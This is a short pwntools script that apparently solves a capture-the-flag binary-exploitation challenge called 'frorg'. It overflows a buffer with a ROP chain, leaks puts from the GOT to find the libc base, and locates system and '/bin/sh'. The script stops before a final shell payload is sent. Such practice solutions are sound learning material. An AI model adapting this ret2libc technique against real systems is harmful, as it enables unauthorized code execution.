from pwn import *
elf = context.binary = ELF("./frorg")
p = elf.process()
#p = remote("byuctf.xyz", 40015)
libc = ELF("libc.so.6")
context.log_level = "debug"
# gdb.attach(p)
def enter_frorgy(name):
    p.recvline()
    p.send(name)

for i in range(2):
    p.recvline()

pop_rdi_ret = 0x004011e5
puts_got = elf.got.puts
puts_plt = elf.plt.puts
_start = elf.sym._start
ret = 0x0040129c
log.info(print(hex(elf.got.puts)))
p.sendline('9')
enter_frorgy("a"*10)
enter_frorgy("a"*10)
enter_frorgy("a"*10)
enter_frorgy("a"*10)
enter_frorgy(b"a"*6 + b'\x00'*2)
enter_frorgy(b"c"*6+p32(pop_rdi_ret))
enter_frorgy(b'\x00'*4+p32(elf.got.puts)+b'\x00'*2)
enter_frorgy(b'\x00'*2+p32(elf.plt.puts)+b'\x00'*4)
enter_frorgy(p32(_start)+b'\x00'*6)
p.recvline()
leak = p.recvline()[:-1]
leak = u64(leak.ljust(8,b'\x00'))
libc.address = leak-libc.sym.puts
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
log.critical(f"Libc base: {hex(libc.address)}")

p.interactive()
